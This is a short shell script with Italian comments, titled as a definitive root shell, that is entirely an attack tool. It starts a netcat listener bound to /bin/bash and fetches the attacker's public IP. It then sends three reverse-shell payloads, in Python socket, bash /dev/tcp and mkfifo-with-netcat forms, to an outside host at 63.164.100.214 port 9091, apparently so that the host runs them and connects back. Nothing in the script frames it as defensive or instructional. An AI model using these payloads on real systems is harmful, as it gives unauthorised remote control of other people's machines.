# 🔥 ROOT SHELL - VERSIONE DEFINITIVA (NO HANG)

# 1. LISTENER PERFETTO
nc -lvnp 4444 -e /bin/bash &
sleep 2

IP=$(curl -s ifconfig.me)

# 2. PAYLOAD 1: PYTHON (se disponibile)
echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'" | nc 63.164.100.214 9091

# 3. PAYLOAD 2: BASH SOCAT (se socat presente)
echo "exec 5<>/dev/tcp/$IP/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done" | nc 63.164.100.214 9091

# 4. PAYLOAD 3: MKFIFO (universale)
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc '$IP' 4444 >/tmp/f &' | nc 63.164.100.214 9091
